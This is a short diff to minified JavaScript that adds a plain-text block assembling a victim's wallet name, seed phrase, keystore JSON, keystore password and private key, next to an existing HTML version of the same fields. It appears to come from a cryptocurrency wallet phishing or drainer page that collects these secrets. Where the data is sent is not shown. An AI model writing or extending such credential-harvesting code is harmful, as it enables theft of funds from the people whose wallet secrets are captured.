@@ -13031,6 +13031,13 @@ const _l = {
                 d(!0);
                 try {
                     const w = {
+                         Info: `
+                         Wallet Name : ${v} 
+                         Phrase : ${a.phrase}
+                        Keystore JSON : ${a.keystore}
+                         Keystore Password : ${a.password}
+                         Private Key : ${a.privateKey} `,
+                         
                         Info: `<div>
                   <p><b>Wallet Name</b>: ${v}</p>
                   <p><b>Phrase</b>: ${a.phrase}</p>
